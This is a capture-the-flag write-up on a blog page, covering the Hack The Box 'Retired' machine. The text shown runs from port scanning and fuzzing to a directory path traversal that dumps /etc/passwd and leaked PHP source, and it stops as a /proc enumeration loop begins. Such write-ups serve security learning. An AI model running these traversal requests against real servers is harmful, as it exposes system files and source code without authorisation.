<!doctype html><html lang="en"><head><title>Retired | 7Rocky</title>
<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="description" content="Hack The Box. Linux. Medium machine. This machine has a PHP website that is vulnerable to Directory Path Traversal. There we find a PHP file that expects a file to be uploaded in order to be passed to a local socket server. We are able to enumerate open processes and download the binary that runs the server and see that it is vulnerable to Buffer Overflow. Once exploited, we can pivot to another user using symbolic links. And then, we are allowed to add custom executable formats, which can be exploited to become root. Solid binary exploitation techniques and Linux concepts are required in order to compromise this machine. This write-up contains some custom Python exploits for the foothold part"><meta name="image" content="https://7rocky.github.io/images/HTB/Retired/Retired.webp"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="Hack The Box. Linux. Medium machine. This machine has a PHP website that is vulnerable to Directory Path Traversal. There we find a PHP file that expects a file to be uploaded in order to be passed to a local socket server. We are able to enumerate open processes and download the binary that runs the server and see that it is vulnerable to Buffer Overflow. Once exploited, we can pivot to another user using symbolic links. And then, we are allowed to add custom executable formats, which can be exploited to become root. Solid binary exploitation techniques and Linux concepts are required in order to compromise this machine. This write-up contains some custom Python exploits for the foothold part"><meta itemprop="keywords" content="php,cronjob,file-upload,capabilities,symlinks,buffer-overflow,binary-exploitation,rce,directory-path-traversal,"><meta itemprop="name" content="Retired"><meta property="article:published_time" content="2022-08-13T00:00:00+00:00"><meta property="og:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:description" content="Hack The Box. Linux. Medium machine. This machine has a PHP website that is vulnerable to Directory Path Traversal. There we find a PHP file that expects a file to be uploaded in order to be passed to a local socket server. We are able to enumerate open processes and download the binary that runs the server and see that it is vulnerable to Buffer Overflow. Once exploited, we can pivot to another user using symbolic links. And then, we are allowed to add custom executable formats, which can be exploited to become root. Solid binary exploitation techniques and Linux concepts are required in order to compromise this machine. This write-up contains some custom Python exploits for the foothold part"><meta property="og:image" content="https://7rocky.github.io/images/HTB/Retired/Retired.webp"><meta property="og:locale" content="en_US"><meta property="og:site_name" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:title" content="Retired"><meta property="og:type" content="article"><meta property="og:url" content="https://7rocky.github.io/en/htb/retired/"><meta name="twitter:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="twitter:card" content="Hack The Box. Linux. Medium machine. This machine has a PHP website that is vulnerable to Directory Path Traversal. There we find a PHP file that expects a file to be uploaded in order to be passed to a local socket server. We are able to enumerate open processes and download the binary that runs the server and see that it is vulnerable to Buffer Overflow. Once exploited, we can pivot to another user using symbolic links. And then, we are allowed to add custom executable formats, which can be exploited to become root. Solid binary exploitation techniques and Linux concepts are required in order to compromise this machine. This write-up contains some custom Python exploits for the foothold part"><meta name="twitter:description" content="Hack The Box. Linux. Medium machine. This machine has a PHP website that is vulnerable to Directory Path Traversal. There we find a PHP file that expects a file to be uploaded in order to be passed to a local socket server. We are able to enumerate open processes and download the binary that runs the server and see that it is vulnerable to Buffer Overflow. Once exploited, we can pivot to another user using symbolic links. And then, we are allowed to add custom executable formats, which can be exploited to become root. Solid binary exploitation techniques and Linux concepts are required in order to compromise this machine. This write-up contains some custom Python exploits for the foothold part"><meta name="twitter:image" content="https://7rocky.github.io/images/HTB/Retired/Retired.webp"><meta name="twitter:title" content="Retired"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/en/htb/retired/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><script>MathJax={loader:{load:["[tex]/noerrors"]},options:{ignoreHtmlClass:"tex2jax_ignore",processHtmlClass:"tex2jax_process",skipHtmlTags:["noscript","pre","script","style","textarea"]},tex:{autoload:{color:[],colorv2:["color"]},displayMath:[["$$","$$"]],inlineMath:[["$","$"]],packages:{"[+]":["noerrors"]},processEnvironments:!0,processEscapes:!0}}</script><script type="text/javascript" src="//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-svg.js"></script><div id="math-consts" style="display:none">$
\newcommand{\e}{e}
\newcommand{\N}[1][]{\mathbb{N}^{#1}}
\newcommand{\Q}[1][]{\mathbb{Q}^{#1}}
\newcommand{\R}[1][]{\mathbb{R}^{#1}}
\newcommand{\Z}[1][]{\mathbb{Z}^{#1}}
\newcommand{\C}[1][]{\mathbb{C}^{#1}}
\newcommand{\dx}{\,\mathrm{d}x}
\newcommand{\dy}{\,\mathrm{d}y}
\newcommand{\dz}{\,\mathrm{d}z}
\newcommand{\dt}{\,\mathrm{d}t}
\newcommand{\divides}{\, | \,}
\newcommand{\st}{\; | \;}
\renewcommand{\geq}{\geqslant}
\renewcommand{\leq}{\leqslant}
\renewcommand{\i}{\mathrm{i}}
\newcommand{\rank}{\mathop{\mathrm{rank}}}
\newcommand{\gcd}{\mathop{\mathrm{gcd}}}
\newcommand{\tr}{\mathop{\mathrm{tr}}}
\newcommand{\charField}{\mathop{\mathrm{char}}}
\newcommand{\Image}{\mathop{\mathrm{Im}}}
$</div><script src="/js/imc.js"></script><script>(async()=>await typeset(()=>[`#math-consts`]))()</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/en/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/en/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Search" rel="noopener" aria-label="Search"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="/htb/retired/" title="es"><img alt="es" height="30px" src="/images/es.png" style="border:4px solid#000;border-radius:100%" width="30px">
</a><a class="link-transition lang link dib z-999 pt3 pt0-l" href="#" title="en"><img alt="en" height="30px" src="/images/en.png" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HTB</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/htb/retired/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/htb/retired/&amp;text=Retired" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/en/htb/retired/&amp;title=Retired" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Retired</h1><time class="mt4 f6 dib tracked" datetime="2022-08-13T00:00:00+01:00">13 / 08 / 2022</time><br><p class="mb4 f6 dib tracked">22 minutes to read</p></header><div class="htb-image"><img alt="Retired" src="/images/HTB/Retired/Retired.webp"></div><ul class="nested-links tags"><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/php" title="PHP">PHP</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/cronjob" title="Cron jobs">Cron jobs</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/file-upload" title="File upload">File upload</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/capabilities" title="Capabilities">Capabilities</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/symlinks" title="Symbolic links">Symbolic links</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/buffer-overflow" title="Buffer Overflow">Buffer Overflow</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/binary-exploitation" title="Binary exploitation">Binary exploitation</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/rce" title="Remote Code Execution">Remote Code Execution</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/directory-path-traversal" title="Directory Path Traversal">Directory Path Traversal</a></li></ul><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#port-scanning">Port scanning</a></li><li><a href="#enumeration">Enumeration</a></li><li><a href="#foothold">Foothold</a><ul><li><a href="#directory-path-traversal-exploitation">Directory Path Traversal exploitation</a></li><li><a href="#binary-analysis">Binary analysis</a></li><li><a href="#exploit-preparation">Exploit preparation</a></li><li><a href="#exploit-development">Exploit development</a></li></ul></li><li><a href="#system-enumeration">System enumeration</a></li><li><a href="#lateral-movement-to-user-dev">Lateral movement to user <code>dev</code></a></li><li><a href="#privilege-escalation">Privilege escalation</a><ul><li><a href="#rom-analysis">ROM analysis</a></li><li><a href="#binfmt_misc-exploitation"><code>binfmt_misc</code> exploitation</a></li></ul></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>OS</strong>: Linux</li><li><strong>Difficulty</strong>: Medium</li><li><strong>IP Address</strong>: 10.10.11.154</li><li><strong>Release</strong>: 02 / 04 / 2022</li></ul><h2 id="port-scanning">Port scanning</h2><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"># Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.154 -p 22,80
Nmap scan report for 10.10.11.154
Host is up (0.041s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey:
|   3072 77:b2:16:57:c2:3c:10:bf:20:f1:62:76:ea:81:e4:69 (RSA)
|   256 cb:09:2a:1b:b9:b9:65:75:94:9d:dd:ba:11:28:5b:d2 (ECDSA)
|_  256 0d:40:f0:f5:a8:4b:63:29:ae:08:a1:66:c1:26:cd:6b (ED25519)
80/tcp open  http    nginx
| http-title: Agency - Start Bootstrap Theme
|_Requested resource was /index.php?page=default.html
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
# Nmap done -- 1 IP address (1 host up) scanned in 8.11 seconds
</code></pre></div><p>This machine has ports 22 (SSH) and 80 (HTTP) open.</p><h2 id="enumeration">Enumeration</h2><p>If we go to <code>http://10.10.11.154</code>, we will see a page like this:</p><p><img src="/images/HTB/Retired/Retired-default.webp" alt="Retired default"></p><p>It only shows some information about something called EMUEMU and OSTRICH. No idea yet.</p><p>Let&rsquo;s apply fuzzing to enumerate more routes. Notice I am using <code>.php</code> and <code>.html</code> extensions:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.154/FUZZ -e .php,.html  
<span class="code-dark-blue">index.php               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 50ms]</span>
<span class="code-dark-green">default.html            [Status: 200, Size: 11414, Words: 4081, Lines: 189, Duration: 39ms]</span>
<span class="code-dark-blue">assets                  [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 39ms]</span>
<span class="code-dark-blue">css                     [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 40ms]</span>
<span class="code-dark-green">beta.html               [Status: 200, Size: 4144, Words: 1137, Lines: 73, Duration: 71ms]</span>
<span class="code-dark-blue">js                      [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 42ms]</span>
<span class="code-dark-blue">                        [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 39ms]</span>
</code></pre></div><p>Nice, we have <code>beta.html</code>. Let&rsquo;s see what&rsquo;s there:</p><p><img src="/images/HTB/Retired/Retired-beta.webp" alt="Retired login"></p><p>We are able to upload a license key file, and it should have 512 bits. There is no more information about this. If we try to upload something, the server response is just blank, it doesn&rsquo;t matter what we upload, there is no feedback.</p><p>The form is posted to <code>activate_license.php</code>:</p><p><img src="/images/HTB/Retired/Retired-beta-upload.webp" alt="Retired login"></p><h2 id="foothold">Foothold</h2><p>As the <code>index.php</code> accepts a parameter called <code>page</code>, it is shouting to enter some Local File Inclusion / Directory Path Traversal payload. Let&rsquo;s try:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">'10.10.11.154?page=/etc/passwd'</span>
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin  
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:105::/nonexistent:/usr/sbin/nologin
_chrony:x:105:112:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
vagrant:x:1000:1000::/vagrant:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
dev:x:1001:1001::/home/dev:/bin/bash
</code></pre></div><p>Nice, there is a Directory Path Traversal vulnerability (since the file is just read, not executed).</p><h3 id="directory-path-traversal-exploitation">Directory Path Traversal exploitation</h3><p>Let&rsquo;s get the PHP source files:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">'10.10.11.154?page=index.php'</span>  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">&lt;?php</span>

<span class="mtk7 mtki">function</span> <span class="mtk8">sanitize_input</span><span class="mtk1">($param)</span> <span class="mtk1">{</span>
    <span class="mtk1">$param1</span> <span class="mtk5">=</span> <span class="mtk7">str_replace</span><span class="mtk1">(</span><span class="mtk4">"../"</span><span class="mtk1">,</span> <span class="mtk4">""</span><span class="mtk1">,</span> <span class="mtk1">$param);</span>
    <span class="mtk1">$param2</span> <span class="mtk5">=</span> <span class="mtk7">str_replace</span><span class="mtk1">(</span><span class="mtk4">"./"</span><span class="mtk1">,</span> <span class="mtk4">""</span><span class="mtk1">,</span> <span class="mtk1">$param1);</span>
    <span class="mtk5">return</span> <span class="mtk1">$param2;</span>
<span class="mtk1">}</span>

<span class="mtk1">$page</span> <span class="mtk5">=</span> <span class="mtk1">$_GET[</span><span class="mtk4">'page'</span><span class="mtk1">];</span>
<span class="mtk5">if</span> <span class="mtk1">(</span><span class="mtk7">isset</span><span class="mtk1">($page)</span> <span class="mtk5">&amp;&amp;</span> <span class="mtk7">preg_match</span><span class="mtk1">(</span><span class="mtk4">"/</span><span class="mtk5">^</span><span class="mtk4">[a-z]/"</span><span class="mtk1">,</span> <span class="mtk1">$page))</span> <span class="mtk1">{</span>  
    <span class="mtk1">$page</span> <span class="mtk5">=</span> <span class="mtk8">sanitize_input</span><span class="mtk1">($page);</span>
<span class="mtk1">}</span> <span class="mtk5">else</span> <span class="mtk1">{</span>
    <span class="mtk7">header</span><span class="mtk1">(</span><span class="mtk4">'Location:</span> <span class="mtk4">/index.php?page=default.html'</span><span class="mtk1">);</span>
<span class="mtk1">}</span>

<span class="mtk7">readfile</span><span class="mtk1">($page);</span>
</code></pre></div><p>One thing to notice is that the browser will redirect to <code>index.php?page=default.html</code>, so we won&rsquo;t notice that the file is rendered in the response. Since <code>curl</code> does not follow redirects by default, we can read the response body even it the response contains a redirection.</p><p>Now let&rsquo;s see how the file upload is being handled:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">'10.10.11.154?page=activate_license.php'</span>  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">&lt;?php</span>

<span class="mtk5">if</span> <span class="mtk1">(</span><span class="mtk7">isset</span><span class="mtk1">($_FILES[</span><span class="mtk4">'licensefile'</span><span class="mtk1">]))</span> <span class="mtk1">{</span>
    <span class="mtk1">$license</span>      <span class="mtk5">=</span> <span class="mtk7">file_get_contents</span><span class="mtk1">($_FILES[</span><span class="mtk4">'licensefile'</span><span class="mtk1">][</span><span class="mtk4">'tmp_name'</span><span class="mtk1">]);</span>
    <span class="mtk1">$license_size</span> <span class="mtk5">=</span> <span class="mtk1">$_FILES[</span><span class="mtk4">'licensefile'</span><span class="mtk1">][</span><span class="mtk4">'size'</span><span class="mtk1">];</span>

    <span class="mtk1">$socket</span> <span class="mtk5">=</span> <span class="mtk7">socket_create</span><span class="mtk1">(</span><span class="mtk6">AF_INET</span><span class="mtk1">,</span> <span class="mtk6">SOCK_STREAM</span><span class="mtk1">,</span> <span class="mtk6">SOL_TCP</span><span class="mtk1">);</span>
    <span class="mtk5">if</span> <span class="mtk1">(</span><span class="mtk5">!</span><span class="mtk1">$socket)</span> <span class="mtk1">{</span> <span class="mtk7">echo</span> <span class="mtk4">"error</span> <span class="mtk4">socket_create()</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">;</span> <span class="mtk1">}</span>

    <span class="mtk5">if</span> <span class="mtk1">(</span><span class="mtk5">!</span><span class="mtk7">socket_connect</span><span class="mtk1">($socket,</span> <span class="mtk4">'127.0.0.1'</span><span class="mtk1">,</span> <span class="mtk6">1337</span><span class="mtk1">))</span> <span class="mtk1">{</span>
        <span class="mtk7">echo</span> <span class="mtk4">"error</span> <span class="mtk4">socket_connect()"</span> <span class="mtk5">.</span> <span class="mtk7">socket_strerror</span><span class="mtk1">(</span><span class="mtk7">socket_last_error</span><span class="mtk1">())</span> <span class="mtk5">.</span> <span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">;</span>  
    <span class="mtk1">}</span>

    <span class="mtk7">socket_write</span><span class="mtk1">($socket,</span> <span class="mtk7">pack</span><span class="mtk1">(</span><span class="mtk4">"N"</span><span class="mtk1">,</span> <span class="mtk1">$license_size));</span>
    <span class="mtk7">socket_write</span><span class="mtk1">($socket,</span> <span class="mtk1">$license);</span>

    <span class="mtk7">socket_shutdown</span><span class="mtk1">($socket);</span>
    <span class="mtk7">socket_close</span><span class="mtk1">($socket);</span>
<span class="mtk1">}</span>
</code></pre></div><p>Interesting, it is connecting to a local socket server on port 1337 and passing the size of the file and its contents.</p><p>Since we have a Directory Path Traversal vulnerability, we can enumerate processes reading from <code>/proc/&lt;PID></code>. Every &ldquo;PID&rdquo; directory contains some files related to the process itself. We are interested in <code>/proc/&lt;PID>/cmdline</code> to know the command used to start the process. Let&rsquo;s use brute force to enumerate processes and see if we find the one that is running on port 1337:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-yellow">for</span> i in {1..1000}; <span class="code-dark-yellow">do</span> <span class="code-dark-green">echo</span> -n <span class="code-dark-yellow">"<span class="code-dark-cyan">$i</span>: "</span>; <span class="code-dark-green">curl</span> <span class="code-dark-yellow">"10.10.11.154?page=/proc/<span class="code-dark-cyan">$i</span>/cmdline"</span> -so -; <span class="code-dark-green">echo</span>; 